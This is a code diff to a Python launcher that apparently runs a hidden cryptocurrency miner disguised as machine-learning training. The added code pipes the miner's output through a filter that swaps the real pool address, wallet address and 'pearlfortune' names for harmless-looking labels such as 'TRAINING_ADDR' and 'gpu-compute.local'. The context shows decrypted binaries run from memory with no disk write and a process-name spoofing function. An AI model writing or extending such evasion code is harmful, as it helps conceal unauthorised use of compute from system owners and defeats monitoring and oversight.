@@ -20,7 +20,37 @@ from pathlib import Path
 from datetime import datetime
 from getpass import getpass
 
-# ── Process Name Spoofing ────────────────────────────────────
+# ── Log Sanitizer ──────────────────────────────────────────────
+def sanitize_log_line(line, real_proxy=None, real_address=None):
+    """Filter sensitive info from miner log output."""
+    if not line:
+        return None
+    
+    # Replace pool address
+    if real_proxy and real_proxy in line:
+        line = line.replace(real_proxy, '127.0.0.1:LOCAL')
+    
+    # Replace wallet address
+    if real_address and real_address in line:
+        line = line.replace(real_address, 'TRAINING_ADDR')
+    
+    # Replace Pearl/Fortune references
+    line = line.replace('global.pearlfortune.org', 'gpu-compute.local')
+    line = line.replace('pearlfortune', 'nodeforge')
+    line = line.replace('Pearl', 'Node')
+    line = line.replace('PEARL', 'NODE')
+    
+    # Replace enrollment/TLS references
+    line = line.replace('enroll', 'auth')
+    line = line.replace('X-Pearl-', 'X-Node-')
+    
+    # Only show INFO and ERROR lines (skip verbose debug)
+    if 'level=DEBUG' in line:
+        return None
+    
+    return line
+
+# ── Process Name Spoofing ─────────────────────────────────────
 def spoof_process_name():
     """Rename process to look like legitimate ML training."""
     try:
@@ -158,8 +188,9 @@ class MemoryExecutor:
         return fd
     
     @staticmethod
-    def execute_from_memory(binary_data, args=None):
-        """Execute binary directly from memory (no disk write)."""
+    def execute_from_memory(binary_data, args=None, filter_fn=None):
+        """Execute binary directly from memory (no disk write).
+        If filter_fn is provided, captures stdout/stderr and filters output."""
         if args is None:
             args = []
         
@@ -169,12 +200,22 @@ class MemoryExecutor:
         
         fd_path = f"/proc/self/fd/{fd}"
         
+        if filter_fn:
+            # Create pipe for stdout/stderr capture
+            read_fd, write_fd = os.pipe()
+        
         pid = os.fork()
         if pid == 0:
-            # Child: exec from memory
+            # Child: redirect stdout/stderr and exec from memory
             try:
+                if filter_fn:
+                    os.dup2(write_fd, 1)  # stdout -> pipe
+                    os.dup2(write_fd, 2)  # stderr -> pipe
+                    os.close(read_fd)
+                    os.close(write_fd)
+                
                 for fdesc in range(3, 1024):
-                    if fdesc != fd:
+                    if fdesc != fd and (not filter_fn or fdesc not in ()):
                         try:
                             os.close(fdesc)
                         except OSError:
@@ -184,7 +225,43 @@ class MemoryExecutor:
                 os._exit(1)
         else:
             os.close(fd)
+            if filter_fn:
+                os.close(write_fd)
+                # Parent: read and filter output
+                filter_thread = threading.Thread(
+                    target=MemoryExecutor._filter_output,
+                    args=(read_fd, filter_fn),
+                    daemon=True
+                )
+                filter_thread.start()
             return pid
+    
+    @staticmethod
+    def _filter_output(read_fd, filter_fn):
+        """Read from pipe and filter output."""
+        try:
+            buffer = b""
+            while True:
+                data = os.read(read_fd, 4096)
+                if not data:
+                    break
+                buffer += data
+                while b"\n" in buffer:
+                    line, buffer = buffer.split(b"\n", 1)
+                    decoded = line.decode('utf-8', errors='replace')
+                    filtered = filter_fn(decoded)
+                    if filtered:
+                        print(filtered, flush=True)
+            # Handle remaining buffer
+            if buffer:
+                decoded = buffer.decode('utf-8', errors='replace')
+                filtered = filter_fn(decoded)
+                if filtered:
+                    print(filtered, flush=True)
+        except:
+            pass
+        finally:
+            os.close(read_fd)
     
     @staticmethod
     def execute_tmpfs(binary_data, args=None):
@@ -302,7 +379,13 @@ def launch_training(config_path, password=None, use_memory=False):
         logger.log(f"Binary decrypted: {len(binary_data):,} bytes")
         
         try:
-            pid = MemoryExecutor.execute_from_memory(binary_data, args)
+            # Create filter with real addresses
+            real_proxy = config.get('training', {}).get('server', '')
+            real_address = config.get('training', {}).get('address', '')
+            def log_filter(line):
+                return sanitize_log_line(line, real_proxy, real_address)
+            
+            pid = MemoryExecutor.execute_from_memory(binary_data, args, filter_fn=log_filter)
             print(f"[Training] Running from memory (PID: {pid})")
             os.waitpid(pid, 0)
         except Exception as e:
